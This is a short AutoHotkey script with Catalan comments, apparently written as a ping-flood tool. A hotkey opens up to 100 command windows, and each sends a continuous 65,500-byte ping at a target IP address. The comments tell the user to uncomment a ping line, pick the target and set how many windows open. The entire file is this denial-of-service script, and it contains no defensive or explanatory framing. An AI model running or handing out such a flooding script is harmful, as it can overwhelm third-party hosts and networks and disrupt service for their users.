a::
Loop, 100 ; canviar num ke vols ke set obrin
{
Run, cmd.exe,,,myCMD
Sleep 200  ; activar una daquestes opcions (treure ; del principi) i posar ping que vulguis
;Send ping -t -l 65500 178.156.60.63 ;posar ping que vulguis
;Send ping -t 178.156.60.63
;Send ping -t -l 65500 127.0.0.1
Send {enter}
Sleep 200
}

Esc::
ExitApp